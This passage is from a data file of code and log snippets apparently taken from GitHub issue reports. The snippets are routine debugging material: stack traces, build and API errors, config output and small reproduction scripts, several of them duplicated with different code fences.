21:09:58 ubuntu15 robonomics[730]: 2020-09-28 21:09:58 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.0kiB/s \u2b06 4.1kiB/s\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWSPayd1AVbkQnoKNY31ct7REiME9F7Bi1Sy4ByZMKghZT, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 15.0kiB/s \u2b06 6.2kiB/s\r\nSep 28 21:10:00 ubuntu15 robonomics[730]: 2020-09-28 21:10:00 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWBBwauXVbCC3TvGvynyi58AwRZSGGLx7KBoKFfcfEbhHD, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:10:01 ubuntu15 robonomics[730]: 2020-09-28 21:10:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWGqrUyhEt4yPPSbGxosjLjdYWjkgJkusM135Tvm1a35AF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\n"
    },
    {
        "logs": "`javascript\r\nconst splitList = advisory.references.split(',')\r\n\r\nlet isUrlList = true\r\nfor (const urlItem of splitList) {\r\n  try {\r\n    new URL(urlItem)\r\n  } catch (err) {\r\n    // if new URL throws an error, than the item isn't a valid URL\r\n    isUrlList = false\r\n  }\r\n}\r\n\r\n// if any of the items do not parse as a URL then it probably isn't a comma-separated list of URLs\r\nreturn isUrlList\r\n"
    },
    {
        "logs": "`\r\n{\r\n  method: 'POST',\r\n  uri: 'https://localhost:8443/1.0/instances/test-vm/exec?project=default',\r\n  rejectUnauthorized: false,\r\n  json: true,\r\n  body: {\r\n    command: [ 'ash' ],\r\n    environment: { HOME: '/root', TERM: 'xterm', USER: 'root' },\r\n    'wait-for-websocket': true,\r\n    interactive: true,\r\n    height: 24,\r\n    width: 83\r\n  }\r\n}\r\n"
    },
    {
        "logs": "```\r\n{\r\n  method: 'POST',\r\n  uri: 'https://localhost:8443/1.0/instances/test-vm/exec?project=default',\r\n  rejectUnauthorized: false,\r\n  json: true,\r\n  body: {\r\n    command: [ 'ash' ],\r\n    environment: { HOME: '/root', TERM: 'xterm', USER: 'root' },\r\n    'wait-for-websocket': true,\r\n    interactive: true,\r\n    height: 24,\r\n    width: 83\r\n  }\r\n}\r\n"
    },
    {
        "logs": "`\r\nrabbitio out -e PXC.TRIGGER -p 250 -q PXC.TRIGGER.PXC -r \\# -u 'amqp://usr:pass@some.rmq.host:5672/rmq-vhl' -d /dev/null/\r\n2022/02/02 20:00:01 RabbitMQ connected: amqp://user:pass@some.rmq.host:5672/rmq-vhl\r\n2022/02/02 20:00:01 Bind to Exchange: \"PXC.TRIGGER\" and Queue: \"PXC.TRIGGER.PXC\", Messaging waiting: 9843598\r\nError: open /dev/null/1_messages_1000.tgz: not a directory\r\n"
    },
    {
        "logs": "```\r\nrabbitio out -e PXC.TRIGGER -p 250 -q PXC.TRIGGER.PXC -r \\# -u 'amqp://usr:pass@some.rmq.host:5672/rmq-vhl' -d /dev/null/\r\n2022/02/02 20:00:01 RabbitMQ connected: amqp://user:pass@some.rmq.host:5672/rmq-vhl\r\n2022/02/02 20:00:01 Bind to Exchange: \"PXC.TRIGGER\" and Queue: \"PXC.TRIGGER.PXC\", Messaging waiting: 9843598\r\nError: open /dev/null/1_messages_1000.tgz: not a directory\r\n"
    },
    {
        "logs": "`\r\napiVersion: kyverno.io/v1\r\nkind: ClusterPolicy\r\nmetadata:\r\n  name: deny-deployment-scaling\r\nspec:\r\n  validationFailureAction: enforce\r\n  background: true\r\n  rules:\r\n  - name: block-scaling-for-deployments\r\n    match:\r\n      resources:\r\n        kinds:\r\n        - Deployment\r\n    validate:\r\n      message: \"Changing {{request.object.kind}} {{request.operation}} {{request.object.spec.replicas}} {{request.oldObject.kind}}/{{request.oldObject.metadata.name}} is not allowed\"\r\n      deny: {}\r\n"
    },
    {
        "logs": "`\r\n\r\nto use Jetty instead of Undertow.\r\n\r\nAny ideas what I'm missing?\n<issue_comment>username_1: Ok, this one I need to check, it seems your using it correctly the "
    },
    {
        "logs": "`. Sorry for the trouble, will be back soon.\n<issue_comment>username_1: ok, @username_0 here are the results! Sorry for waiting...\r\n\r\n1. First, the "
    },
    {
        "logs": "` in your case, the parsing fails. So that explains the issue you are having.\r\n2. I can fix that easily - when the target type is "
    },
    {
        "logs": "` scope only deal with JSON _parsing_? If not, how to distinguish between JSON strings and rawbody?\r\n+ [ ] Should I add simple placeholders for all reserved names instead? For example:\r\n\r\n    @In @Scope(SERVLET) BodySupplier body\r\n\r\nwdyt?\n<issue_comment>username_0: To be honest, the whole concept of reserved name i a little new to me and I miss a section named \"Reserved/Predefined injection names\" or alike explaining in a short table what I get.\r\n\r\nIf I understand you correctly, depending on the scope I can use different, predefined names to access preexisting values in that Scope like:\r\n\r\n"
    },
    {
        "logs": "` ?\n<issue_comment>username_1: @username_0 you are right! Let's make it beautiful :)\r\n\r\nLet's go over few topics we have here :)\r\n\r\n## [1] Existing injections and reserved names\r\n\r\nSince "
    },
    {
        "logs": "`\r\nDart analysis server, SDK version 2.2.1-edge.571ea80e1101e706980ea8aefa7fc18a0c8ba2ec, server version 1.24.0, error: Captured exception\r\nInvalid argument(s)\r\n#0      _TypedList._setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:2066:77)\r\n#1      _ByteDataView.setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:4264:16)\r\n#2      ApiSignature.addInt (package:analyzer/src/summary/api_signature.dart:95:11)\r\n#3      UnlinkedExprBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:22389:19)\r\n#4      UnlinkedExecutableBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:21432:21)\r\n#5      UnlinkedClassBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:19482:12)\r\n#6      UnlinkedUnitBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:25511:12)\r\n#7      _SummarizeAstVisitor._computeApiSignature (package:analyzer/src/summary/summarize_ast.dart:1401:7)\r\n#8      _SummarizeAstVisitor.serializeCompilationUnit (package:analyzer/src/summary/summarize_ast.dart:478:5)\r\n#9      serializeAstUnlinked (package:analyzer/src/summary/summarize_ast.dart:22:8)\r\n#10     FileState.refresh.<anonymous closure> (package:analyzer/src/dart/analysis/file_state.dart:476:46)\r\n#11     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#12     FileState.refresh (package:analyzer/src/dart/analysis/file_state.dart:475:26)\r\n#13     FileTracker.verifyApiSignature.<anonymous closure> (package:analyzer/src/dart/analysis/file_tracker.dart:231:32)\r\n#14     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#15     FileTracker.verifyApiSignature (package:analyzer/src/dart/analysis/file_tracker.dart:227:20)\r\n#16     FileTracker.verifyChangedFilesIfNeeded (package:analyzer/src/dart/analysis/file_tracker.dart:300:9)\r\n#17     AnalysisDriver.performWork (package:analyzer/src/dart/analysis/driver.dart:1080:22)\r\n<asynchronous suspension>\r\n#18     AnalysisDriverScheduler._run (package:analyzer/src/dart/analysis/driver.dart:2145:24)\r\n<asynchronous suspension>\r\n#19     AnalysisDriverScheduler.start (package:analyzer/src/dart/analysis/driver.dart:2075:5)\r\n#20     new AnalysisServer (package:analysis_server/src/analysis_server.dart:213:29)\r\n#21     SocketServer.createAnalysisServer (package:analysis_server/src/socket_server.dart:86:26)\r\n#22     StdioAnalysisServer.serveStdio (package:analysis_server/src/server/stdio_server.dart:37:18)\r\n#23     Driver.startAnalysisServer.<anonymous closure> (package:analysis_server/src/server/driver.dart:511:21)\r\n#24     _rootRun (dart:async/zone.dart:1124:13)\r\n#25     _CustomZone.run (dart:async/zone.dart:1021:19)\r\n#26     _runZoned (dart:async/zone.dart:1516:10)\r\n#27     runZoned (dart:async/zone.dart:1463:12)\r\n#28     Driver._captureExceptions (package:analysis_server/src/server/driver.dart:594:12)\r\n#29     Driver.startAnalysisServer (package:analysis_server/src/server/driver.dart:509:7)\r\n#30     Driver.start (package:analysis_server/src/server/driver.dart:412:7)\r\n#31     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:12:11)\r\n#32     _AsyncAwaitCompleter.start (dart:async/runtime/lib/async_patch.dart:49:6)\r\n#33     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:10:10)\r\n#34     _startIsolate.<anonymous closure> (dart:isolate/runtime/lib/isolate_patch.dart:298:32)\r\n#35     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/lib/isolate_patch.dart:171:12)\r\n"
    },
    {
        "logs": "```\r\nDart analysis server, SDK version 2.2.1-edge.571ea80e1101e706980ea8aefa7fc18a0c8ba2ec, server version 1.24.0, error: Captured exception\r\nInvalid argument(s)\r\n#0      _TypedList._setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:2066:77)\r\n#1      _ByteDataView.setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:4264:16)\r\n#2      ApiSignature.addInt (package:analyzer/src/summary/api_signature.dart:95:11)\r\n#3      UnlinkedExprBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:22389:19)\r\n#4      UnlinkedExecutableBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:21432:21)\r\n#5      UnlinkedClassBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:19482:12)\r\n#6      UnlinkedUnitBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:25511:12)\r\n#7      _SummarizeAstVisitor._computeApiSignature (package:analyzer/src/summary/summarize_ast.dart:1401:7)\r\n#8      _SummarizeAstVisitor.serializeCompilationUnit (package:analyzer/src/summary/summarize_ast.dart:478:5)\r\n#9      serializeAstUnlinked (package:analyzer/src/summary/summarize_ast.dart:22:8)\r\n#10     FileState.refresh.<anonymous closure> (package:analyzer/src/dart/analysis/file_state.dart:476:46)\r\n#11     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#12     FileState.refresh (package:analyzer/src/dart/analysis/file_state.dart:475:26)\r\n#13     FileTracker.verifyApiSignature.<anonymous closure> (package:analyzer/src/dart/analysis/file_tracker.dart:231:32)\r\n#14     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#15     FileTracker.verifyApiSignature (package:analyzer/src/dart/analysis/file_tracker.dart:227:20)\r\n#16     FileTracker.verifyChangedFilesIfNeeded (package:analyzer/src/dart/analysis/file_tracker.dart:300:9)\r\n#17     AnalysisDriver.performWork (package:analyzer/src/dart/analysis/driver.dart:1080:22)\r\n<asynchronous suspension>\r\n#18     AnalysisDriverScheduler._run (package:analyzer/src/dart/analysis/driver.dart:2145:24)\r\n<asynchronous suspension>\r\n#19     AnalysisDriverScheduler.start (package:analyzer/src/dart/analysis/driver.dart:2075:5)\r\n#20     new AnalysisServer (package:analysis_server/src/analysis_server.dart:213:29)\r\n#21     SocketServer.createAnalysisServer (package:analysis_server/src/socket_server.dart:86:26)\r\n#22     StdioAnalysisServer.serveStdio (package:analysis_server/src/server/stdio_server.dart:37:18)\r\n#23     Driver.startAnalysisServer.<anonymous closure> (package:analysis_server/src/server/driver.dart:511:21)\r\n#24     _rootRun (dart:async/zone.dart:1124:13)\r\n#25     _CustomZone.run (dart:async/zone.dart:1021:19)\r\n#26     _runZoned (dart:async/zone.dart:1516:10)\r\n#27     runZoned (dart:async/zone.dart:1463:12)\r\n#28     Driver._captureExceptions (package:analysis_server/src/server/driver.dart:594:12)\r\n#29     Driver.startAnalysisServer (package:analysis_server/src/server/driver.dart:509:7)\r\n#30     Driver.start (package:analysis_server/src/server/driver.dart:412:7)\r\n#31     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:12:11)\r\n#32     _AsyncAwaitCompleter.start (dart:async/runtime/lib/async_patch.dart:49:6)\r\n#33     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:10:10)\r\n#34     _startIsolate.<anonymous closure> (dart:isolate/runtime/lib/isolate_patch.dart:298:32)\r\n#35     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/lib/isolate_patch.dart:171:12)\r\n"
    },
    {
        "logs": "`Error: Uncaught (in promise): Attempt to invoke virtual method 'boolean android.hardware.fingerprint.FingerprintManager.isHardwareDetected()' on a null object reference"
    },
    {
        "logs": "` r\r\ntrees = parallel::mclapply(c(7L, 15L), igraphlite::graph_tree, mc.cores = 2L)\r\ntrees[[1L]]\r\n# Error in sprintf(\"C++ object <%s> of class '%s' <%s>\", externalptr_address(pointer), :\r\n#   external pointer is not valid\r\n"
    },
    {
        "logs": "``` r\r\ntrees = parallel::mclapply(c(7L, 15L), igraphlite::graph_tree, mc.cores = 2L)\r\ntrees[[1L]]\r\n# Error in sprintf(\"C++ object <%s> of class '%s' <%s>\", externalptr_address(pointer), :\r\n#   external pointer is not valid\r\n"
    },
    {
        "logs": "`\r\n[100%] Completed 'rapidjson_external'\r\nmake[2]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\n[100%] Built target rapidjson_external\r\nmake[1]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\nCMake Error at cmake/build_helpers.cmake:129 (message):\r\n  Did not find this build in the environment variable PATH.  Please add\r\n  /home/adamm/ginkgo/build/windows_shared_library into the environment\r\n  variable PATH.\r\nCall Stack (most recent call first):\r\n  cmake/build_helpers.cmake:40 (ginkgo_check_shared_library)\r\n  core/devices/CMakeLists.txt:3 (ginkgo_compile_features)\r\n  core/devices/omp/CMakeLists.txt:1 (ginkgo_add_object_library)\r\n\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeOutput.log\".\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeError.log\".\r\n"
    },
    {
        "logs": "```\r\n[100%] Completed 'rapidjson_external'\r\nmake[2]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\n[100%] Built target rapidjson_external\r\nmake[1]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\nCMake Error at cmake/build_helpers.cmake:129 (message):\r\n  Did not find this build in the environment variable PATH.  Please add\r\n  /home/adamm/ginkgo/build/windows_shared_library into the environment\r\n  variable PATH.\r\nCall Stack (most recent call first):\r\n  cmake/build_helpers.cmake:40 (ginkgo_check_shared_library)\r\n  core/devices/CMakeLists.txt:3 (ginkgo_compile_features)\r\n  core/devices/omp/CMakeLists.txt:1 (ginkgo_add_object_library)\r\n\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeOutput.log\".\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeError.log\".\r\n"
    },
    {
        "logs": "`go\r\n// Error custom error to pass ErrorCodes to user.\r\ntype Error struct {\r\n\tmsg        string\r\n\tErrorCodes []string\r\n        RequestError bool\r\n}\r\n"
    },
    {
        "logs": "`go\r\n\tresponse, err := r.client.PostForm(r.ReCAPTCHALink, formValues)\r\n\tif err != nil {\r\n\t\tErr = &Error{msg: fmt.Sprintf(\"error posting to recaptcha endpoint: '%s'\", err), RequestError: true}\r\n\t\treturn\r\n\t}\r\n\tdefer response.Body.Close()\r\n\tresultBody, err := ioutil.ReadAll(response.Body)\r\n\tif err != nil {\r\n\t\tErr = &Error{msg: fmt.Sprintf(\"couldn't read response body: '%s'\", err), RequestError: true}\r\n\t\treturn\r\n\t}\r\n\tvar result reCHAPTCHAResponse\r\n\terr = json.Unmarshal(resultBody, &result)\r\n\tif err != nil {\r\n\t\tErr = &Error{msg: fmt.Sprintf(\"invalid response body json: '%s'\", err), RequestError: true}\r\n\t\treturn\r\n\t}\r\n"
    },
    {
        "logs": "```go\r\n// Error custom error to pass ErrorCodes to user.\r\ntype Error struct {\r\n\tmsg        string\r\n\tErrorCodes []string\r\n        RequestError bool\r\n}\r\n"
    },
    {
        "logs": "`\r\nStatus 500: {\"message\":\"Get \\\"https://XXX.jfrog.io/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\nTRACE    2021-09-13 13:32:15.370com.github.dockerjava.api.exception.InternalServerErrorException: Status 500: {\"message\":\"Get \\\"https://XXX/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\n\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.execute(DefaultInvocationBuilder.java:247)\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:269)\r\n\tat java.base/java.lang.Thread.run(Unknown Source)\r\n"
    },
    {
        "logs": "```\r\nStatus 500: {\"message\":\"Get \\\"https://XXX.jfrog.io/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\nTRACE    2021-09-13 13:32:15.370com.github.dockerjava.api.exception.InternalServerErrorException: Status 500: {\"message\":\"Get \\\"https://XXX/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\n\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.execute(DefaultInvocationBuilder.java:247)\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:269)\r\n\tat java.base/java.lang.Thread.run(Unknown Source)\r\n"
    },
    {
        "logs": "`\r\nError 263 for command:\r\n        close source/backend/sound/files/black-move.wav\r\n    The specified device is not open or is not recognized by MCI.\r\nFailed to close the file: source/backend/sound/files/black-move.wav\r\n"
    },
    {
        "logs": "```\r\nError 263 for command:\r\n        close source/backend/sound/files/black-move.wav\r\n    The specified device is not open or is not recognized by MCI.\r\nFailed to close the file: source/backend/sound/files/black-move.wav\r\n"
    },
    {
        "logs": "`\r\nError: error creating API Gateway v2 domain name (): BadRequestException: Error retrieving certificate from ACM: The certificate '' must have a fully-qualified domain name, a supported signature, and a supported key size.\r\n\r\n  on .terraform/modules/api-auth-proxy/modules/subdomain/apigateway.tf line 1, in resource \"aws_apigatewayv2_domain_name\" \"subdomain\":\r\n   1: resource \"aws_apigatewayv2_domain_name\" \"subdomain\" {\r\n\r\n"
    },
    {
        "logs": "`coffee\r\n@viewer.listen 'close', => \r\n  @isShown = false\r\n  setTimeout @viewer?.destroy, 15000\r\n@viewer.listen 'destroy', => \r\n  @isShown = false\r\n  @viewer = null\r\n"
    },
    {
        "logs": "`coffee\r\n@viewer.listen 'close', => \r\n  @isShown = false\r\n  setTimeout =>\r\n    @viewer?.destroy()\r\n  , 15000\r\n@viewer.listen 'destroy', => \r\n  @isShown = false\r\n  @viewer = null\r\n"
    },
    {
        "logs": "```coffee\r\n@viewer.listen 'close', => \r\n  @isShown = false\r\n  setTimeout @viewer?.destroy, 15000\r\n@viewer.listen 'destroy', => \r\n  @isShown = false\r\n  @viewer = null\r\n"
    },
    {
        "logs": "```coffee\r\n@viewer.listen 'close', => \r\n  @isShown = false\r\n  setTimeout =>\r\n    @viewer?.destroy()\r\n  , 15000\r\n@viewer.listen 'destroy', => \r\n  @isShown = false\r\n  @viewer = null\r\n"
    },
    {
        "logs": "`\r\n\r\nI get this error when migrating a course achievement. Inspected the source code, there is a validation which calls the following method:\r\n"
    },
    {
        "logs": "`json\r\n{\r\n   \"error\":{\r\n      \"errors\":[\r\n         {\r\n            \"domain\":\"global\",\r\n            \"reason\":\"badRequest\",\r\n            \"message\":\"Type not supported: userKey\"\r\n         }\r\n      ],\r\n      \"code\":400,\r\n      \"message\":\"Type not supported: userKey\"\r\n   }\r\n}\r\n"
    },
    {
        "logs": "```json\r\n{\r\n   \"error\":{\r\n      \"errors\":[\r\n         {\r\n            \"domain\":\"global\",\r\n            \"reason\":\"badRequest\",\r\n            \"message\":\"Type not supported: userKey\"\r\n         }\r\n      ],\r\n      \"code\":400,\r\n      \"message\":\"Type not supported: userKey\"\r\n   }\r\n}\r\n"
    },
    {
        "logs": "`\r\nkubectl api-resources  ## from kubernetes 1.11\r\nsee https://kubernetes.io/docs/reference/kubectl/cheatsheet/\r\n\r\nerror: unable to retrieve the complete list of server APIs: mutators.kubedb.com/v1alpha1: the server is currently unable to handle the request, validators.kubedb.com/v1alpha1: the server is currently unable to handle the request\r\n\r\n"
    },
    {
        "logs": "```\r\nkubectl api-resources  ## from kubernetes 1.11\r\nsee https://kubernetes.io/docs/reference/kubectl/cheatsheet/\r\n\r\nerror: unable to retrieve the complete list of server APIs: mutators.kubedb.com/v1alpha1: the server is currently unable to handle the request, validators.kubedb.com/v1alpha1: the server is currently unable to handle the request\r\n\r\n"
    },
    {
        "logs": "`bash\r\n{\r\n  \"timestamp\" : 1538008639775,\r\n  \"status\" : 500,\r\n  \"error\" : \"Internal Server Error\",\r\n  \"exception\" : \"java.lang.NullPointerException\",\r\n  \"message\" : \"No message available\"\r\n}\r\n"
    },
    {
        "logs": "`\r\ntype Int64 has no field rows\r\n\r\nStacktrace:\r\n [1] getproperty(::Int64, ::Symbol) at ./Base.jl:33\r\n [2] length(::Parquet.ColCursor{String}) at ./In[39]:2\r\n [3] top-level scope at In[40]:1\r\n [4] include_string(::Function, ::Module, ::String, ::String) at ./loading.jl:1091\r\n"
    },
    {
        "logs": "```\r\ntype Int64 has no field rows\r\n\r\nStacktrace:\r\n [1] getproperty(::Int64, ::Symbol) at ./Base.jl:33\r\n [2] length(::Parquet.ColCursor{String}) at ./In[39]:2\r\n [3] top-level scope at In[40]:1\r\n [4] include_string(::Function, ::Module, ::String, ::String) at ./loading.jl:1091\r\n"
    },
    {
        "logs": "`\r\nERROR: Error doing post analysis query: Evaluation of query \"@external_001//...\" failed: no targets found beneath ''\r\n"
    },
    {
        "logs": "`\r\n#!/bin/bash\r\n\r\nWORKSPACE_DIR=$(mktemp -d)\r\nLOCAL_REPOSITORY_DIR=$(mktemp -d)\r\n\r\necho \"WORKSPACE:${WORKSPACE_DIR}\"\r\necho \"LOCAL_REPOSITORY_DIR:${LOCAL_REPOSITORY_DIR}\"\r\n\r\n# Write out a workspace file referencing\r\n# the local repository.\r\ncat << EOF > \"${WORKSPACE_DIR}/WORKSPACE\"\r\nworkspace(name = \"root\")\r\n\r\nlocal_repository(\r\n   name = \"external_001\",\r\n   path = \"${LOCAL_REPOSITORY_DIR}\",\r\n)\r\nEOF\r\n\r\ncat << EOF > \"${LOCAL_REPOSITORY_DIR}/WORKSPACE\"\r\nworkspace(name = \"external_001\")\r\nEOF\r\n\r\n\r\n# Now we can make a few targets, so aquery has\r\n# something to report. We will mirror the BUILD.bazel files\r\n\r\nfor dir in ${WORKSPACE_DIR} ${LOCAL_REPOSITORY_DIR}; do\r\ncat << EOF > \"${dir}/script1.sh\"\r\n#/bin/bash\r\necho \"this is script 1\"\r\nEOF\r\n\r\ncat << EOF > \"${dir}/script2.sh\"\r\n#/bin/bash\r\necho \"this is script 2\"\r\nEOF\r\n\r\ncat << EOF > \"${dir}/BUILD.bazel\"\r\npackage(\r\n   default_visibility = [\"//visibility:public\"],\r\n)\r\n\r\nsh_binary(\r\n   name = \"script1\",\r\n   srcs =[\"script1.sh\"],\r\n)\r\n\r\nsh_binary(\r\n   name = \"script2\",\r\n   srcs =[\"script2.sh\"],\r\n)\r\nEOF\r\n\r\ndone\r\n\r\n(\r\n   cd \"${WORKSPACE_DIR}\"\r\n\r\n   set -x\r\n   # Queries in the root workspace, all return success\r\n   bazel aquery '//:script1'\r\n   bazel aquery '//:all'\r\n   bazel aquery '//...'\r\n\r\n   # Now on the external repository, the \"//...\" will fail\r\n   bazel aquery '@external_001//:script1'\r\n   bazel aquery '@external_001//:all'\r\n   bazel aquery '@external_001//...'\r\n)\r\n\r\nrm -rf \"${WORKSPACE_DIR}\"\r\nrm -rf \"${LOCAL_REPOSITORY_DIR}\"\r\n"
    },
    {
        "logs": "```\r\nERROR: Error doing post analysis query: Evaluation of query \"@external_001//...\" failed: no targets found beneath ''\r\n"
    },
    {
        "logs": "`typescript\r\n\r\nexport enum RequestType {\r\n    launch,\r\n    kill,\r\n    authorise,\r\n    share\r\n}\r\n\r\nexport enum Signal {\r\n    Ok,\r\n    Error_Denied\r\n    Error_Invalid\r\n}\r\n\r\nexport namespace RequestHandlers extends Record<RequestType, () => Signal> {\r\n    export function launch() {\r\n        // ...\r\n        return Signal.Ok\r\n    }\r\n    // ...\r\n}\r\n\r\nexport default function handleRequest<Handler extends keyof typeof RequestHandlers>(request: Handler): ReturnType<RequestHandlers[Handler]> {\r\n    if (request in RequestHandlers)\r\n        return requestHandlers[request]();\r\n}\r\n\r\n"
    },
    {
        "logs": "```typescript\r\n\r\nexport enum RequestType {\r\n    launch,\r\n    kill,\r\n    authorise,\r\n    share\r\n}\r\n\r\nexport enum Signal {\r\n    Ok,\r\n    Error_Denied\r\n    Error_Invalid\r\n}\r\n\r\nexport namespace RequestHandlers extends Record<RequestType, () => Signal> {\r\n    export function launch() {\r\n        // ...\r\n        return Signal.Ok\r\n    }\r\n    // ...\r\n}\r\n\r\nexport default function handleRequest<Handler extends keyof typeof RequestHandlers>(request: Handler): ReturnType<RequestHandlers[Handler]> {\r\n    if (request in RequestHandlers)\r\n        return requestHandlers[request]();\r\n}\r\n\r\n"
    },
    {
        "logs": "`\r\n$ ki -h\r\nUsage: ki [-h] [--version] \r\n\r\n  -h, --help                Prints help\r\n  --version                 Print version\r\nException in thread \"main\" kotlinx.cli.HelpPrintedException\r\n\tat kotlinx.cli.FlagArgumentsKt$help$1.invoke(FlagArguments.kt:96)\r\n\tat kotlinx.cli.FlagAction$DefaultImpls.invoke(Actions.kt:9)\r\n\tat kotlinx.cli.FlagActionBase.invoke(FlagArguments.kt:4)\r\n\tat kotlinx.cli.CommandLineParser.doParse(CommandLineParser.kt:56)\r\n\tat kotlinx.cli.CommandLineParser.parseTokenized(CommandLineParser.kt:21)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:11)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:7)\r\n\tat kotlinx.cli.ParseKt.parse(parse.kt:8)\r\n\tat org.jetbrains.kotlinx.ki.shell.KotlinShell.main(KotlinShell.kt:22)\r\n"
    },
    {
        "logs": "```\r\n$ ki -h\r\nUsage: ki [-h] [--version] \r\n\r\n  -h, --help                Prints help\r\n  --version                 Print version\r\nException in thread \"main\" kotlinx.cli.HelpPrintedException\r\n\tat kotlinx.cli.FlagArgumentsKt$help$1.invoke(FlagArguments.kt:96)\r\n\tat kotlinx.cli.FlagAction$DefaultImpls.invoke(Actions.kt:9)\r\n\tat kotlinx.cli.FlagActionBase.invoke(FlagArguments.kt:4)\r\n\tat kotlinx.cli.CommandLineParser.doParse(CommandLineParser.kt:56)\r\n\tat kotlinx.cli.CommandLineParser.parseTokenized(CommandLineParser.kt:21)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:11)\r\n\tat kotlinx.cli.CommandLineParser.parse(CommandLineParser.kt:7)\r\n\tat kotlinx.cli.ParseKt.parse(parse.kt:8)\r\n\tat org.jetbrains.kotlinx.ki.shell.KotlinShell.main(KotlinShell.kt:22)\r\n"
    },
    {
        "logs": "`shell\nvite:config bundled config file loaded in 207.83ms +0ms\r\n  vite:config using resolved config: {\r\n  vite:config   plugins: [\r\n  vite:config     'vite:pre-alias',\r\n  vite:config     'alias',\r\n  vite:config     'vite:react-babel',\r\n  vite:config     'vite:react-refresh',\r\n  vite:config     'vite:react-jsx',\r\n  vite:config     'vite:modulepreload-polyfill',\r\n  vite:config     'vite:resolve',\r\n  vite:config     'vite:html-inline-proxy',\r\n  vite:config     'vite:css',\r\n  vite:config     'vite:esbuild',\r\n  vite:config     'vite:json',\r\n  vite:config     'vite:wasm',\r\n  vite:config     'vite:worker',\r\n  vite:config     'vite:worker-import-meta-url',\r\n  vite:config     'vite:asset',\r\n  vite:config     'vite:define',\r\n  vite:config     'vite:css-post',\r\n  vite:config     'vite:client-inject',\r\n  vite:config     'vite:import-analysis'\r\n  vite:config   ],\r\n  vite:config   server: {\r\n  vite:config     preTransformRequests: true,\r\n  vite:config     fs: { strict: true, allow: [Array], deny: [Array] }\r\n  vite:config   },\r\n  vite:config   resolve: { dedupe: [ 'react', 'react-dom' ], alias: [ [Object], [Object] ] },\r\n  vite:config   optimizeDeps: {\r\n  vite:config     include: [ 'react/jsx-dev-runtime' ],\r\n  vite:config     esbuildOptions: { keepNames: undefined, preserveSymlinks: undefined }\r\n  vite:config   },\r\n  vite:config   configFile: '/Users/stickb/Code/scratch/vite-gboost-ui-error/vite.config.ts',\r\n  vite:config   configFileDependencies: [ 'vite.config.ts' ],\r\n  vite:config   inlineConfig: {\r\n  vite:config     root: undefined,\r\n  